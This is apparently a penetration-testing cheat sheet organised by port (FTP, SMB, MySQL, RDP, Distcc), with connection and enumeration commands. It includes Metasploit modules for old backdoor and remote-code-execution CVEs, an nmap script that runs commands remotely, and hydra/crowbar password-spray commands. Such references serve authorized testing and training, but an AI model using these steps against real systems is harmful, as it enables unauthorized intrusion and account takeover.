# FTP (21)
## Connection
```bash
$ ftp <IP>
```
## Commands 
- ls
- get [FILE]
- mget [FILE] [FILE]
- put [FILE]
- exit
## Exploits
vsftpd 2.3.4 
- CVE-2011-2523 -> exploit/unix/ftp/vsftpd_234_backdoor (Metasploit)
	- Backdoor on port 6200

# SSH (22)
## General 
```bash
$ ssh <USER>@<IP>
```
## Options 
```bash
-p <PORT>
```
# SMB (139,445)
## SMB Shares Enumeration
```bash
$ smbmap -H <IP>
```
```bash
$ smbclient -L \\<IP>
```
## SMB Share Selection
```bash
$ smbclient  \\\\<IP>\\<SHARE>
```
### Commands
- **dir**: list files in current directory
- **more** <FILE>: see contents of file
- **get** <FILE>: download file to attacking device
- **cd**: change directory
- **put** <FILE>: upload file to target device

## Exploitation
### Samba
**Vulnerability**: Samba 3.0.20 < 3.0.25rc3 can be vulnerable to **CVE-2007-2447**, which allows remote code execution due to insufficient access control.
#### Exploitation using Metasploit
```bash
use exploit/multi/samba/usermap_script
set RHOSTS
set LHOST
```
# MySQL (3306)
## Connection 
```bash
$ mysql -u <username> -p -h <ip> -P <port>
```
```bash
$ mysql -u <username> -p -h <ip> -P <port> --skip-ssl
```
## Commands
### Show All Databases
```bash
show databases;
```
### Select Database
```bash
use <table>;
```
### Show Tables in Database
```bash
show tables;
```
### Display Table
```bash
select * from <table>;
```
# RDP (3389)
## Enumeration
### Automatic
```bash
$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
It checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
### Brute Force
	Be CAREFUL you might lock accounts 
### Password Sprays
	Be CAREFUL you might lock accounts 
#### Crowbar
https://github.com/galkan/crowbar
```bash
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### hydra
```bash
$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
	
## Connection
### xfreerdp
#### Fixed Screen:
```bash
$ xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-seclevel:0
```
#### Adjustable Screen:
```bash
$ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
```
# Distcc (3632)
Distcc is a distributed compiler tool that speeds up compilation by offloading tasks to other networked systems running the `distccd` daemon.
## Exploitation
**Vulnerability**: Distcc can be vulnerable to **CVE-2004-2687**, which allows remote code execution due to insufficient access control.
### Test Exploit using Nmap
Nmap can be used to test the vulnerability by executing a command on the remote system, such as retrieving the `id` of the current user:
```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```
### Exploitation with Metasploit
You can exploit this vulnerability using Metasploit:
```bash
use exploit/unix/misc/distcc_exec
```


# Mystery Port
## Connection
```bash
$ nc <IP> <PORT>
```

